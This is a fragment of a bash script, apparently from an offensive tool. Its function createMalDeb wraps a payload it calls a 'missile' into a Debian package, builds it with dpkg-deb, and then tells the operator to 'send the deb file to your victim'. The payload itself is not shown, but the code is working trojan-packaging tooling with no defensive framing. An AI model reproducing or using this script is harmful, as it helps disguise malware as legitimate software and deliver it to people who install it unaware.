# Create a Debpackage
control(){
    while read line;do
	$line
    done << EOF > ${fileName}$vnum$vnumber/DEBIAN/control
echo Package: ${fileName}
echo Maintainer: <${email}>
echo Version: $vnumber
echo Architecture: all
echo Description: $description
EOF
}


createMalDeb() {
    while printf "${open}${light}${green}Should i associate the missile with a %s package?[y|n]: ${close}" \
		 "${pPackage}"; \
	  read $opt -e inmissile
    do
	case $inmissile in
	    y|Y)	dirfile="${0##*/}${SPID}"
			echo ""
			printf "${open}${light}${yellow}[!]Creating Directories and files, Please wait...${close}\n\n"
			mkdir "$dirfile"
			cd "$_" 
			mkdir -p usr/local/bin && mkdir DEBIAN
			cd usr/local/bin
			
			chk_file
			packagedetails
			cd ../../../../
			
			mv "${dirfile}" "${fileName}$vnum$vnumber"
			cd "$(pwd)/${fileName}$vnum$vnumber/usr/local/bin/"
			#mv ./* "${CUT_SHIT}"
			cd ../../../../
			control
			dpkg-deb --build "${fileName}$vnum$vnumber" &>/dev/null &
			stat=$?
			wait %1
			
			if [[ $stat != 0 ]];then
			    
			    printf "${open}${light}%s${red}${close}\n" "Fatal Error"
			    rm -rf "${fileName}$vnum$vnumber"
			    printf "${open}${light}${red}Error encountered while building debian package${close}\n"
			    exit 1
			    
			fi
			
			printf "${open}${light}${green}You can now send the deb file to your victim ${close}\n"
			rm -rf "${fileName}$vnum$vnumber"
			break
			;;
	    *)
		printf "${open}${light}${red}%s${close}" "Invalid Response" && continue ;;
	esac
    done   
}
